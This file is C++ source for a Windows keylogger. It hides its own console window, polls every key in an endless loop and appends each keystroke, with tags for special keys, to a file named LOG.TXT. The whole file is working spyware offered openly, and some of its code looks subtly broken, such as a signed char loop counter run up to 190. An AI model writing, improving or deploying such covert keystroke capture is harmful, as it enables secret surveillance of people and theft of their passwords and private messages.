#define _CRT_SECURE_NO_DEPRECATE //placed for unsafe warnings of fopen

#include<stdio.h>
#include <iostream>
#define _WIN32_WINNT 0x0500
#include <Windows.h>
//#include <WinUser.h>

using namespace std;


class Keylogger
{
public:
    int Save (int key_stroke, char *file)
{
    if (key_stroke == 1|| key_stroke == 2)
    {
		return 0;
	}
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+"); //#define used to prevent warning (at top)
    cout << key_stroke << endl;

	//changed format to reduce lines
    if (key_stroke == 8) fprintf (OUTPUT_FILE, "%s", "[BACKSPACE]\n");
		else if (key_stroke == 13) fprintf (OUTPUT_FILE, "%s", "[/n]\n");
		else if (key_stroke == 32) fprintf (OUTPUT_FILE, "%s", " ");
		else if (key_stroke == VK_TAB) fprintf (OUTPUT_FILE, "%s", "[TAB]");
		else if (key_stroke == VK_SHIFT) fprintf (OUTPUT_FILE, "%s", "[SHIFT]");
		else if (key_stroke == VK_CONTROL) fprintf (OUTPUT_FILE, "%s", "[CONTROL]");
		else if (key_stroke == VK_ESCAPE) fprintf (OUTPUT_FILE, "%s", "[ESCAPE]");
		else if (key_stroke == VK_END) fprintf (OUTPUT_FILE, "%s", "[END]\n");
		else if (key_stroke == VK_HOME) fprintf (OUTPUT_FILE, "%s", "[HOME]");
		else if (key_stroke == VK_LEFT) fprintf (OUTPUT_FILE, "%s", "[LEFT}");
		else if (key_stroke == VK_RIGHT) fprintf (OUTPUT_FILE, "%s", "[RIGHT]");
		else if (key_stroke == VK_UP) fprintf (OUTPUT_FILE, "%s", "[UP]");
		else if (key_stroke == VK_DOWN) fprintf (OUTPUT_FILE, "%s", "[DOWN]");
		else if (key_stroke == 190 || key_stroke == 110) fprintf (OUTPUT_FILE, "%s", " . ");

		//corrected logic error
		else fprintf (OUTPUT_FILE, "%s", &key_stroke);

		fclose (OUTPUT_FILE); //always closes despite any conditionals
		return 0;
}

};


int main()
{
    Keylogger object;
    char i;
    ShowWindow( GetConsoleWindow(), SW_HIDE );
    while (1)
    {
          for (i = 8; i <= 190; i++)
          {
			if (GetAsyncKeyState(i) == -32767)
			{
				object.Save(i,"LOG.TXT");
			}
          }
	}
   // std::cin.get();		//instead of sys pause, although will never occur because of the
    return 0;			//infinite while loop
}
/* ********************** */
/* ********************** */

//changed "Key_stroke" to "key_stroke"
//also changed 's' to 'S' because that's how function was defined (line 7)




